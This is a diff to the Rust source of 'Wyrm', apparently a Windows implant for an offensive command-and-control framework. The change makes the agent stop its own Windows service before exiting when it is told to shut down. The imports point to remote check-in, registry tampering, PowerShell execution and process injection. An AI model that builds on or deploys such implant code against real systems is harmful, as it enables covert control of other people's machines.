@@ -1,7 +1,9 @@
 //! Wyrm represents the state and structure of the implant itself, including any functions
 //! on the implant.
 
-use std::{collections::VecDeque, path::PathBuf, process::exit, ptr::null_mut};
+use std::{
+    collections::VecDeque, path::PathBuf, process::exit, ptr::null_mut, sync::atomic::Ordering,
+};
 
 use rand::{Rng, rng};
 use serde::Serialize;
@@ -27,6 +29,7 @@ use windows_sys::{
 
 use crate::{
     comms::comms_http_check_in,
+    entry::IS_IMPLANT_SVC,
     native::{
         accounts::{ProcessIntegrityLevel, get_logged_in_username, get_process_integrity_level},
         filesystem::{
@@ -37,7 +40,7 @@ use crate::{
         registry::{reg_add, reg_del, reg_query},
         shell::run_powershell,
     },
-    utils::time_utils::epoch_now,
+    utils::{svc_controls::stop_svc_and_exit, time_utils::epoch_now},
 };
 
 pub struct RetriesBeforeExit {
@@ -147,6 +150,11 @@ impl Wyrm {
             // Killing the agent currently only supports killing the whole process.
             // If this was injected into another process, this will kill the host.
             // Threading injection support to be added in the future.
+
+            if IS_IMPLANT_SVC.load(Ordering::SeqCst) {
+                stop_svc_and_exit()
+            }
+
             std::process::exit(0);
         }
 
